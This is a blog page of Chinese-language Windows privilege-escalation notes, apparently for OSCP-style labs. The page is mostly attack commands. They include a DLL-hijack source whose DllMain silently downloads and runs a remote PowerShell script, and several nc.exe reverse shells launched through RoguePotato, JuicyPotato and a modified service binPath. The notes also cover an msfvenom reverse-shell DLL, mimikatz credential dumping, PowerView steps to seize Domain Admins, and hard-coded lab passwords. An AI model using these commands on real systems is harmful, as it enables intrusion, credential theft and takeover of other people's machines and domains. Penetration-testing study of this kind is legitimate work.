<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>windows 提权 | 养猪日记</title>
<meta name=keywords content><meta name=description content='提权检查项目：注意细心！！！！！！！！！！一切异常情况
目前实验发现，备份文件、历史记录、内存密码、特殊程序都有可能，然后是密码复用，administrator
1、计划任务，配合手动可以查看下次运行时间
2、服务，查看是否具备重启服务或者自动运行重启计算机的权限
3、DLL劫持去看软件目录日志吧
4、不可相信命令查看的软件列表，需要手动慢慢看
5、注意WINPEASS的输出，可能存在明文的密码
6、内核提权不多，重点在于特权提权
7、一些特殊的软件或者目录，keepass2\putty\
信息收集
start /b 程序  后台运行
cmd /k start 后台运行
查看管理员用户组：
本地
net localgroup administrators

获取所有组
net localgroup
Get-LocalGroup
用户添加：
net group site_admin awallace /add /domain

进阶操作：
net user cxk cxk123! /add /domain   添加用户进域
net group 组名 用户名 /add 添加用户到组
net localgroup "Remote Management Users" cxk /add  添加到远程管理组
查看当前用户所属组：
whoami /groups
通过注册表查看已经安装了的软件：
64位：
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

32位：
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
通过目录查看安装软件情况：
C:\Program Files (x86)
C:\Program Files
\AppData\Roaming\

C:\Users\cxk\AppData\Roaming
正在运行的进程：'><meta name=author content="养猪日记"><link rel=canonical href=https://yangzhuzai.github.io/posts/oscp/windows-%E6%8F%90%E6%9D%83/><link crossorigin=anonymous href=/assets/css/stylesheet.54405a410796490bc874ab6181fac9b675753cc2b91375d8f882566459eca428.css integrity="sha256-VEBaQQeWSQvIdKthgfrJtnV1PMK5E3XY+IJWZFnspCg=" rel="preload stylesheet" as=style><link rel=icon href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://yangzhuzai.github.io/posts/oscp/windows-%E6%8F%90%E6%9D%83/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="windows 提权"><meta property="og:description" content='提权检查项目：注意细心！！！！！！！！！！一切异常情况
目前实验发现，备份文件、历史记录、内存密码、特殊程序都有可能，然后是密码复用，administrator
1、计划任务，配合手动可以查看下次运行时间
2、服务，查看是否具备重启服务或者自动运行重启计算机的权限
3、DLL劫持去看软件目录日志吧
4、不可相信命令查看的软件列表，需要手动慢慢看
5、注意WINPEASS的输出，可能存在明文的密码
6、内核提权不多，重点在于特权提权
7、一些特殊的软件或者目录，keepass2\putty\
信息收集
start /b 程序  后台运行
cmd /k start 后台运行
查看管理员用户组：
本地
net localgroup administrators

获取所有组
net localgroup
Get-LocalGroup
用户添加：
net group site_admin awallace /add /domain

进阶操作：
net user cxk cxk123! /add /domain   添加用户进域
net group 组名 用户名 /add 添加用户到组
net localgroup "Remote Management Users" cxk /add  添加到远程管理组
查看当前用户所属组：
whoami /groups
通过注册表查看已经安装了的软件：
64位：
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

32位：
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
通过目录查看安装软件情况：
C:\Program Files (x86)
C:\Program Files
\AppData\Roaming\

C:\Users\cxk\AppData\Roaming
正在运行的进程：'><meta property="og:type" content="article"><meta property="og:url" content="https://yangzhuzai.github.io/posts/oscp/windows-%E6%8F%90%E6%9D%83/"><meta property="og:image" content="https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-10-11T14:25:59+08:00"><meta property="article:modified_time" content="2024-10-11T14:25:59+08:00"><meta property="og:site_name" content="养猪日记"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="windows 提权"><meta name=twitter:description content='提权检查项目：注意细心！！！！！！！！！！一切异常情况
目前实验发现，备份文件、历史记录、内存密码、特殊程序都有可能，然后是密码复用，administrator
1、计划任务，配合手动可以查看下次运行时间
2、服务，查看是否具备重启服务或者自动运行重启计算机的权限
3、DLL劫持去看软件目录日志吧
4、不可相信命令查看的软件列表，需要手动慢慢看
5、注意WINPEASS的输出，可能存在明文的密码
6、内核提权不多，重点在于特权提权
7、一些特殊的软件或者目录，keepass2\putty\
信息收集
start /b 程序  后台运行
cmd /k start 后台运行
查看管理员用户组：
本地
net localgroup administrators

获取所有组
net localgroup
Get-LocalGroup
用户添加：
net group site_admin awallace /add /domain

进阶操作：
net user cxk cxk123! /add /domain   添加用户进域
net group 组名 用户名 /add 添加用户到组
net localgroup "Remote Management Users" cxk /add  添加到远程管理组
查看当前用户所属组：
whoami /groups
通过注册表查看已经安装了的软件：
64位：
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

32位：
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
通过目录查看安装软件情况：
C:\Program Files (x86)
C:\Program Files
\AppData\Roaming\

C:\Users\cxk\AppData\Roaming
正在运行的进程：'><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://yangzhuzai.github.io/posts/"},{"@type":"ListItem","position":2,"name":"windows 提权","item":"https://yangzhuzai.github.io/posts/oscp/windows-%E6%8F%90%E6%9D%83/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"windows 提权","name":"windows 提权","description":"提权检查项目：注意细心！！！！！！！！！！一切异常情况\n目前实验发现，备份文件、历史记录、内存密码、特殊程序都有可能，然后是密码复用，administrator\n1、计划任务，配合手动可以查看下次运行时间 2、服务，查看是否具备重启服务或者自动运行重启计算机的权限 3、DLL劫持去看软件目录日志吧 4、不可相信命令查看的软件列表，需要手动慢慢看 5、注意WINPEASS的输出，可能存在明文的密码 6、内核提权不多，重点在于特权提权 7、一些特殊的软件或者目录，keepass2\\putty\\\n信息收集 start /b 程序 后台运行 cmd /k start 后台运行 查看管理员用户组：\n本地 net localgroup administrators 获取所有组 net localgroup Get-LocalGroup 用户添加：\nnet group site_admin awallace /add /domain 进阶操作： net user cxk cxk123! /add /domain 添加用户进域 net group 组名 用户名 /add 添加用户到组 net localgroup \u0026#34;Remote Management Users\u0026#34; cxk /add 添加到远程管理组 查看当前用户所属组：\nwhoami /groups 通过注册表查看已经安装了的软件：\n64位： Get-ItemProperty \u0026#34;HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\u0026#34; | select displayname 32位： Get-ItemProperty \u0026#34;HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\u0026#34; | select displayname 通过目录查看安装软件情况：\nC:\\Program Files (x86) C:\\Program Files \\AppData\\Roaming\\ C:\\Users\\cxk\\AppData\\Roaming 正在运行的进程：\n","keywords":[],"articleBody":"提权检查项目：注意细心！！！！！！！！！！一切异常情况\n目前实验发现，备份文件、历史记录、内存密码、特殊程序都有可能，然后是密码复用，administrator\n1、计划任务，配合手动可以查看下次运行时间 2、服务，查看是否具备重启服务或者自动运行重启计算机的权限 3、DLL劫持去看软件目录日志吧 4、不可相信命令查看的软件列表，需要手动慢慢看 5、注意WINPEASS的输出，可能存在明文的密码 6、内核提权不多，重点在于特权提权 7、一些特殊的软件或者目录，keepass2\\putty\\\n信息收集 start /b 程序 后台运行 cmd /k start 后台运行 查看管理员用户组：\n本地 net localgroup administrators 获取所有组 net localgroup Get-LocalGroup 用户添加：\nnet group site_admin awallace /add /domain 进阶操作： net user cxk cxk123! /add /domain 添加用户进域 net group 组名 用户名 /add 添加用户到组 net localgroup \"Remote Management Users\" cxk /add 添加到远程管理组 查看当前用户所属组：\nwhoami /groups 通过注册表查看已经安装了的软件：\n64位： Get-ItemProperty \"HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\" | select displayname 32位： Get-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\" | select displayname 通过目录查看安装软件情况：\nC:\\Program Files (x86) C:\\Program Files \\AppData\\Roaming\\ C:\\Users\\cxk\\AppData\\Roaming 正在运行的进程：\nGet-Process 辅助脚本 PEASSL: https://github.com/carlospolop/PEASS-ng/releases/tag/20231224-836b4ac9 Seatbelt： https://github.com/GhostPack/Seatbelt https://github.com/r3motecontrol/Ghostpack-CompiledBinaries?tab=readme-ov-file 服务提权 查找服务，并过滤不处于运行中的服务，注意非用户安装的，就是非常规**C:\\Windows\\System32**下面的： Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'} \u003e 2.txt 权限表： MASK\tPERMISSIONS F\tFull access M\tModify access RX\tRead and execute access R\tRead-only access W\tWrite-only access 查看服务启动模式： Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'} Restart-Service xxx Stop-Service xxx 查找服务提权的Ps脚本 1、https://github.com/itm4n/PrivescCheck.git http远程调用： powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.9/PrivescCheck.ps1');Invoke-PrivescCheck\" 2、https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1 使用方法： powershell -ep bypass . .\\PowerUp.ps1 Get-ModifiableServiceFile 微软官方，powershell管理服务的方法： https://learn.microsoft.com/zh-cn/powershell/scripting/samples/managing-services?view=powershell-7.4#stopping-starting-suspending-and-restarting-services DLL劫持(需要RDP） 下载软件： https://learn.microsoft.com/en-us/sysinternals/downloads/procmon\ndll.cpp\n#include #include BOOL APIENTRY DllMain( HANDLE hModule,// Handle to DLL module DWORD ul_reason_for_call,// Reason for calling function LPVOID lpReserved ) // Reserved { switch ( ul_reason_for_call ) { case DLL_PROCESS_ATTACH: // A process is loading the DLL. int i; i = system (\"powershell.exe -nop -w hidden -c IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.240/nishang.ps1')\"); break; case DLL_THREAD_ATTACH: // A process is creating a new thread. break; case DLL_THREAD_DETACH: // A thread exits normally. break; case DLL_PROCESS_DETACH: // A process unloads the DLL. break; } return TRUE; } 编译：\nx86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll 路径，以下目录皆可：\n$env:path 服务路径提权 查找，首先找到非常规目录的服务： Get-CimInstance -ClassName win32_service | Select Name,State,PathName 或者： wmic service get name,pathname | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\"\" 如果显示程序占用可以使用move: move bd.exe original.exe 然后确认是否具备重启服务，或者服务自动启动+重启机器的权限 Restart-Service GammaService net stop mysql 重启机器，如果没有权限修改服务的情况下： 必须拥有SeShutDownPrivilege权限： shutdown /r /t 0 随后确认路径是否具备写入权限： icacls \"C:\\Program Files\" 随后写入，然后重新启动 Restart-Service GammaService 值得注意的是，软件名字为带空格的目录的第一个单词， 举例： C:\\Program Files\\Enterprise Apps\\Current.exe C:\\Program Files\\Enterprise Apps\\Current Version\\GammaServ.exe 小技巧： 可以使用正则表达式： .*\\bsvchost\\b.* .*\".* 计划任务提权 Scheduled Applications\n查看计划任务： schtasks /query /fo LIST /v 查看目录权限： icacls C:\\Users\\steve\\Pictures\\BackendCacheCleanup.exe 提权WIKI https://github.com/carlospolop/PEASS-ng/releases/tag/20231224-836b4ac9 这里面也有域内的漏洞： https://github.com/SecWiki/windows-kernel-exploits 特权提权 https://github.com/gtworek/Priv2Admin SeManageVolume 运行即可获取C盘所有读写权限，利用DLL劫持，systeminfo即可提权\nhttps://github.com/CsEnox/SeManageVolumeExploit/ SeImpersonatePrivilege提权 土豆家族：\nhttps://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/Windows%E6%8F%90%E6%9D%83/JuicyPotato.md\n总结 如果机器 \u003e= Windows 10 1809 \u0026 Windows Server 2019 试试Rogue Potato 如果机器 \u003c Windows 10 1809 \u003c Windows Server 2019 试试Juicy Potato\n神薯 https://github.com/BeichenDream/GodPotato/releases/tag/V1.20\nRoguePotato\n资料 https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato github https://github.com/antonioCoco/RoguePotato?tab=readme-ov-file juicypotato可以从服务账户提权，服务账户的权限也需要进行检查 kali: sudo socat tcp-listen:135,reuseaddr,fork tcp:192.168.217.247:9999 nc -lvvp 4444 windows: RoguePotato.exe -r 192.168.45.194 -e \"c:\\Windows\\System32\\spool\\drivers\\color\\nc.exe -e cmd.exe 192.168.45.194 4444\" -l 9999 查找CLSID https://ohpe.it/juicy-potato/CLSID/Windows_10_Pro/ RoguePotato.exe -r 192.168.45.185 -c \"{6d8ff8df-730d-11d4-bf42-00b0d0118b56}\" -e \"c:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\nc.exe -e cmd.exe 192.168.45.185 4444\" -l 9999 roguepotato-and-printspoofer\nhttps://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer SweetPotato\u0026printspoofer\nSeImpersonatePrivilege 权限才行 https://github.com/uknowsec/SweetPotato?tab=readme-ov-file SweetPotato.exe -a whoami wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe .\\PrintSpoofer64.exe -i -c powershell.exe https://github.com/uknowsec/JuicyPotato 推荐这个，webshell版本\nJuicyPotato_x32.exe -l 1337 -c \"{4991d34b-80a1-4291-83b6-3328366b9097}\" -p c:\\windows\\system32\\spool\\drivers\\color\\nc.exe -a \"-e cmd 192.168.45.184 4445\" 常用内核提权 https://github.com/abatchy17/WindowsExploits https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#tools 常见漏洞 \u003c1\u003e 远程漏洞 ms03-026 ms03-039 (1) ms03-039 (2) ms03-049 ms04-007 ms04-011 - ssl bof ms04-011 - lsasarv.dll ms04-031 ms05-017 ms05-039 ms06-040 (1) ms06-040 (2) ms06-070 ms08-067 (1) ms08-067 (2) ms08-067 (3) ms09-050 \u003c2\u003e 本地漏洞 ms04-011 ms04-019 (1) ms04-019 (2) ms04-019 (3) ms04-020 keybd_event ms05-018 ms05-055 ms06-030 ms06-049 print spool service ms08-025 netdde ms10-015 ms10-059 ms10-092 ms11-080 ms14-040 ms14-058 (1) ms14-058 (2) ms14-070 (1) ms14-070 (2) ms15-010 (1) ms15-010 (2) **ms15-051** https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#tools ms16-014 ms16-016 **ms16-032** https://github.com/zcgonvh/MS16-032/releases/tag/Release meterpreter 在整个学习期间，其实是尽量在减少对meterpreter的使用的，这里只记录一些常见的使用：\n迁移进程： getpid 查看当前pid ps 寻找可迁移的pid migrate \u003c目标PID\u003e 查看远程活动窗口\u0026截图\nqwinsta /server:127.0.0.1 powershell 查看本地用户 Get-LocalUser UnauthorizedAccess问题：\n查看权限： Get-ExecutionPolicy -Scope CurrentUser 更改： Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser 使用账号密码切换用户：\n方法一： $passwd = ConvertTo-SecureString \"l33th4x0rhector\" -AsPlainText -force $cred = New-Object System.Management.Automation.PSCredential (\"hector\", $passwd) Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock {(Get-Acl -Path .\\keepmeon).Access | Where-Object { $_.IdentityReference -eq $env:USERNAME } \"c:\\Program Files\\keepmeon\"} -credential $cred 方法二： $password = convertto-securestring -AsPlainText -Force -String \"l33th4x0rhector\" $credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"CONTROL\\hector\",$password # testing Invoke-Command -ComputerName LOCALHOST -ScriptBlock { whoami } -Credential $credential $passwd = ConvertTo-SecureString \"W3_4R3_th3_f0rce.\" -AsPlainText -force $cred = New-Object System.Management.Automation.PSCredential (\"acute\\imonks\", $passwd) Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock {whoami} -credential $cred pwoershell 修改文件内容：\n((Get-Content \"c:\\users\\imonks\\Desktop\\wm.ps1\" -Raw) -replace 'Get-Volume','cmd.exe /c c:\\utils\\cxk2.exe') | set-content -path c:\\users\\imonks\\Desktop\\wm.ps1 powershell历史记录位置\n$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 查看当前用户权限：\nwhoami /priv net user 用户名 powershell常用命令：\n获取系统信息： Get-WmiObject -Class Win32_OperatingSystem 导入脚本： import-module .\\脚本 查看菜单： menu 删除文件： Remove-Item -Path C:\\path\\to\\file.txt powershell身份切换，类似于su的实现： 执行whoami: $password = convertto-securestring -AsPlainText -Force -String \"36mEAhz/B8xQ~2VM\"; $credential = new-object -typename System.Management.Automation.PSCredential -argumentlist \"SNIPER\\chris\",$password; Invoke-Command -ComputerName LOCALHOST -ScriptBlock { whoami } -credential $credential; 反弹shell: 执行程序 Start-Process -FilePath c:\\users\\nico\\downloads\\SharpHound.exe powershell 绕过： C:\\WIndOWs\\sySwOw64\\WINdOwspOweRshEll\\v1.0\\poWersHeLl.Exe 查看隐藏文件： Get-ChildItem -Force 身份切换方式2： https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1 import-module ./Invoke-RunasCs.ps1 Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command \"whoami\" 列出文件树：\nGet-ChildItem -Recurse 文件查找：\nGet-ChildItem -Path C:\\ -Include *flag* -File -Recurse -ErrorAction SilentlyContinue windows本地提权 服务提权：\n1、创建服务： sc.exe config vss binPath=\"C:\\Users\\svc-printer\\Documents\\nc.exe -e cmd.exe 10.10.14.2 1234\" 2、开启服务： sc.exe stop vss sc.exe start vss 权限赋予 授予权限： icacls C:\\path\\to\\your\\directory /grant username:(permissions) username: 要授予权限的用户名。 permissions: 要授予的权限。例如，F 表示完全控制，R 表示读取，W 表示写入等。可以使用多个字母组合，如 RW 表示读写权限。 域内提权注意权限： GenericAll: Full permissions on object GenericWrite: Edit certain attributes on the object WriteOwner: Change ownership of the object WriteDACL: Edit ACE's applied to object AllExtendedRights: Change password, reset password, etc. ForceChangePassword: Password change for object Self (Self-Membership): Add ourselves to for example a group BACKUP OPERATORS组提权 推荐\nhttps://pentestlab.blog/2024/01/22/domain-escalation-backup-operator/ 资料\nhttps://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960#f402 https://github.com/jakobfriedl/precompiled-binaries/tree/e6f7025e75dfc906d14e2fe33d0ebc6a321ece4a https://www.bordergate.co.uk/backup-operator-privilege-escalation/ 推荐\nhttps://gist.github.com/manesec/9e0e8000446b966d0f0ef74000829801 推荐\nhttps://www.thehacker.recipes/a-d/movement/credentials/dumping/sam-and-lsa-secrets GenericWrite权限 powerview Set-DomainObject -Identity maria -SET @{scriptpath=\"C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\powercat.ps1\"} WriteOwner 组权限 upload PowerView.ps1 Import-Module .\\PowerView.ps1 1。 设置为组所有者 Set-DomainObjectOwner -Identity 'Domain Admins' -OwnerIdentity 'maria' 2. 给自己授予全部权限 Add-DomainObjectAcl -TargetIdentity \"Domain Admins\" -PrincipalIdentity maria -Rights All 3. 把自己添加到dbadmin Add-DomainGroupMember -Identity 'Domain Admins' -Members 'maria' WriteOwner 用户权限 . .\\PowerView.ps1 //将PowerView导入 把当前用户tom设置为claire用户的 ACL 的所有者并授予其修改密码的权限 Set-DomainObjectOwner -Identity claire -OwnerIdentity tom Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword -Verbose 设置claire的密码为Ab345678123!@# $cred = ConvertTo-SecureString \"Ab345678123!@#\" -AsPlainText -force Set-DomainUserPassword -identity claire -accountpassword $cred Genericall 权限 使用hash的方式修改密码，如果使用明文密码的话，取消最后面的--pw-nt-hash即可 net rpc password \"Tristan.Davies\" \"newP@ssword2023\" -U \"search.htb\"/\"BIR-ADFS-GMSA$\" -S \"RESEARCH.search.htb\" --pw-nt-hash mimikatz ```第一步，提升权限： privilege::debug token::elevate 以所有方式获取密码： sekurlsa::logonpasswords 以SAM获取密码： lsadump::sam 导出TGT： sekurlsa::tickets /export 查看TGT： dir *.kirbi 导入TGT，后面的是TGT文件名字： kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi ./mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\" \u003emimikatz.txt ./mimikatz.exe \"lsadump::sam /sam:c:\\windows.old\\Windows\\System32\\SAM /system:c:\\windows.old\\Windows\\System32\\SYSTEM\" \"exit\" \u003e\u003e sam.txt ./mimikatz.exe \"vault::list\" \"exit\" \u003emimikatz.txt 更多使用方法：\nhttps://mp.weixin.qq.com/s/IDE2QEzVeuXk6liNeXhxpg powershell版本：\nhttps://github.com/clymb3r/PowerShell/blob/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1 密码本和信息检索 git\n在软件目录中查找：\nGet-ChildItem -Path C:\\xampp -Include *.ini -File -Recurse -ErrorAction SilentlyContinue powershell \"Get-ChildItem -Path C:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue\" 在用户目录下查找：\nGet-ChildItem -Path C:\\Users\\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini,*.xml,*.log,*.kdbx,*.exe -File -Recurse -ErrorAction SilentlyContinue powershell历史记录：\n获取文件存储位置： (Get-PSReadlineOption).HistorySavePath 事件查看器： eventvwr.msc Event Viewer → Events from Script Block Logging are in Application and Services → Microsoft → Windows → PowerShell → Operational: Click Filter Current Log and search for 4104 events flag隐藏： 备用数据流：\nC:\\Users\\Administrator\\Desktop\u003edir /R dir /R Volume in drive C has no label. Volume Serial Number is 71A1-6FA1 Directory of C:\\Users\\Administrator\\Desktop 11/08/2017 10:05 AM . 11/08/2017 10:05 AM .. 12/24/2017 03:51 AM 36 hm.txt 34 hm.txt:root.txt:$DATA 11/08/2017 10:05 AM 797 Windows 10 Update Assistant.lnk 2 File(s) 833 bytes 2 Dir(s) 2,440,134,656 bytes free C:\\Users\\Administrator\\Desktop\u003epowershell Get-Content -Path \"hm.txt\" -Stream \"root.txt\" powershell Get-Content -Path \"hm.txt\" -Stream \"root.txt\" afbc5bd4b615a60648cec41c6ac9253 GUI下的身份切换 runas /user:backupadmin cmd C盘写入提权 systeminfo c:\\windows\\system32\\wbem tzres.dll msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.154 LPORT=135 -f dll -o tzres.dll ","wordCount":"1079","inLanguage":"en","image":"https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2024-10-11T14:25:59+08:00","dateModified":"2024-10-11T14:25:59+08:00","author":{"@type":"Person","name":"养猪日记"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://yangzhuzai.github.io/posts/oscp/windows-%E6%8F%90%E6%9D%83/"},"publisher":{"@type":"Organization","name":"养猪日记","logo":{"@type":"ImageObject","url":"https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://yangzhuzai.github.io/ accesskey=h title="Home (Alt + H)"><img src=https://yangzhuzai.github.io/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://yangzhuzai.github.io/categories/ title=分类><span>分类</span></a></li><li><a href=https://yangzhuzai.github.io/search/ title=搜索><span>搜索</span></a></li><li><a href=https://github.com/yangzhuzai title=Github><span>Github</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://yangzhuzai.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://yangzhuzai.github.io/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">windows 提权</h1><div class=post-meta><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;·&nbsp;6 min&nbsp;·&nbsp;1079 words&nbsp;·&nbsp;养猪日记</div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#辅助脚本>辅助脚本</a></li></ul><ul><li><a href=#查找服务提权的ps脚本>查找服务提权的Ps脚本</a></li><li><a href=#dll劫持需要rdp>DLL劫持(需要RDP）</a></li><li><a href=#服务路径提权>服务路径提权</a></li></ul><ul><li><a href=#权限赋予>权限赋予</a></li></ul><ul><li><a href=#backup-operators组提权>BACKUP OPERATORS组提权</a></li><li><a href=#genericwrite权限>GenericWrite权限</a><ul><li><a href=#writeowner-组权限>WriteOwner 组权限</a></li><li><a href=#writeowner-用户权限>WriteOwner 用户权限</a></li></ul></li><li><a href=#genericall-权限>Genericall 权限</a></li></ul></nav></div></details></div><div class=post-content><p>提权检查项目：注意细心！！！！！！！！！！一切异常情况</p><p>目前实验发现，备份文件、历史记录、内存密码、特殊程序都有可能，然后是密码复用，administrator</p><p>1、计划任务，配合手动可以查看下次运行时间
2、服务，查看是否具备重启服务或者自动运行重启计算机的权限
3、DLL劫持去看软件目录日志吧
4、不可相信命令查看的软件列表，需要手动慢慢看
5、注意WINPEASS的输出，可能存在明文的密码
6、内核提权不多，重点在于特权提权
7、一些特殊的软件或者目录，keepass2\putty\</p><h1 id=信息收集>信息收集<a hidden class=anchor aria-hidden=true href=#信息收集>#</a></h1><pre tabindex=0><code>start /b 程序  后台运行
cmd /k start 后台运行
</code></pre><p>查看管理员用户组：</p><pre tabindex=0><code>本地
net localgroup administrators

获取所有组
net localgroup
Get-LocalGroup
</code></pre><p>用户添加：</p><pre tabindex=0><code>net group site_admin awallace /add /domain

进阶操作：
net user cxk cxk123! /add /domain   添加用户进域
net group 组名 用户名 /add 添加用户到组
net localgroup &#34;Remote Management Users&#34; cxk /add  添加到远程管理组
</code></pre><p>查看当前用户所属组：</p><pre tabindex=0><code>whoami /groups
</code></pre><p>通过注册表查看已经安装了的软件：</p><pre tabindex=0><code>64位：
Get-ItemProperty &#34;HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*&#34; | select displayname

32位：
Get-ItemProperty &#34;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*&#34; | select displayname
</code></pre><p>通过目录查看安装软件情况：</p><pre tabindex=0><code>C:\Program Files (x86)
C:\Program Files
\AppData\Roaming\

C:\Users\cxk\AppData\Roaming
</code></pre><p>正在运行的进程：</p><pre tabindex=0><code>Get-Process
</code></pre><h2 id=辅助脚本>辅助脚本<a hidden class=anchor aria-hidden=true href=#辅助脚本>#</a></h2><pre tabindex=0><code>PEASSL:
